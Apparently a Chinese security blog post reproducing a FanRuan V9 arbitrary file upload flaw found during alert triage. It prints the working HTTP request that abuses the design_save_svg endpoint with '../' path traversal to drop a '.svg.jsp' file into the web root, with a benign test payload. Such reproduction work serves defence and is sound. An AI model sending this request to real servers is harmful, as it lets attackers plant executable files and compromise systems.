ailx10说：这篇是在2024年4月之前写的，后来又改过。告警里帆软 V9 的上传请求带了个很醒目的文件名，让我起了复现的念头。于是找旧安装包搭环境，沿 SVG 保存接口看路径怎样被处理，先用测试字符串观察文件是否被改，再换个新文件确认落盘。一步步做下来，才把那串长 URL 里的参数和磁盘上的结果对应起来。这篇没有追求换多少花样，主要记录从一条线上载荷回到本地环境的过程；能先把最小现象看清，再说后续影响，比盯着一个看似厉害的扩展名更踏实。

---

上周告警分析，遇到了一个帆软 V9 任意文件上传，威胁载荷如下：唐伯虎888，觉得有点意思，寻思复现一下

```
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/tangbohu.svg.jsp HTTP/1.1



{"__CONTENT__":"tangbohu888","__CHARSET__":"UTF-8"}
```

今天做了一个复现，找了一个2018年的帆软 V9 安装包，好不容易安装成功了

![](/notes-assets/8eb50f66db0b51290ad6.webp)

通过 Everything 查找 `update.jsp` 文件，发现覆盖成功了

![](/notes-assets/5003f3fd4a0ff0dcb261.webp)

只需要将POST请求中的`update.jsp` 修改成`111.svg.jsp` ，就可以实现任意文件上传

```
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/111.svg.jsp HTTP/1.1
```

![](/notes-assets/7cb18cd5ab7c8378a051.webp)

成功上传`111.svg.jsp`文件

请求里已经带着登录态，测试结果就不能直接叫未授权。保留这个前提，也保留写文件与执行之间的距离，漏洞复现才不会越写越大。
